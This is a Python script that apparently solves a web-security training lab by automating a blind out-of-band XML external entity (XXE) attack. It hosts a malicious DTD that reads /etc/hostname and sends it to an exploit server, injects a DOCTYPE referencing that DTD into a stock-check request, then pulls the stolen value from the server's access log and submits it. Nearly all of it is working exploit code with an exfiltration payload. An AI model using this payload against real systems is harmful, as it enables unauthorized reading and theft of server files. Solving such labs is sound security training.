from ...utils import *
from ...exploit_server import ExploitServer

from urllib.parse import urljoin
from html import unescape
from lxml import etree

import requests
import re

def solve_lab(url, proxies):
    exploit_server = ExploitServer(url, proxies)
    head = [
        "HTTP/1.0 200 OK",
        "Content-Type: text/xml; charset=utf-8"
    ]
    body = [
        '<!ENTITY % file SYSTEM "file:///etc/hostname">',
        f"<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM '{exploit_server.url}/?x=%file;'>\">",
        "%eval;",
        "%exfiltrate;",
    ]
    exploit_server.craft_response('/malicious.dtd', '\n'.join(head), '\n'.join(body))

    url = urljoin(url, "/product/stock")

    doctype = f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{exploit_server.url}/malicious.dtd"> %xxe;]>'
    stock_check = etree.Element("stockCheck")
    etree.SubElement(stock_check, "productId").text = "1"
    etree.SubElement(stock_check, "storeId").text = "1"

    data = etree.tostring(
        stock_check, encoding="UTF-8", xml_declaration=True, doctype=doctype
    )
    data = unescape(data.decode())

    print_info(
        f'Injecting an XML external entity with the following POST request data to "{url}":\n'
    )
    print(f"{data}\n")

    requests.post(url, proxies=proxies, verify=False, data=data)
    print_success("XXE injection successful.\n")

    print_info("Extracting hostname from exploit server log...")
    log = exploit_server.access_log()
    hostnames = re.findall(r'(?<=\/\?x=)[^ ]+', log)

    if len(hostnames) == 0:
        print_fail("Unable to extract hostname.")
    else:
        hostname = hostnames[-1]
        print_success(f"Hostname: {hostname}\n")

    print_info("Submitting hostname as solution...")
    url = urljoin(url, "/submitSolution")
    data = {"answer": hostname}
    resp = requests.post(url, proxies=proxies, verify=False, data=data)

    if resp.json()["correct"]:
        print_success('Correct answer!\n')
    else:
        print_fail('Incorrect answer.')
    
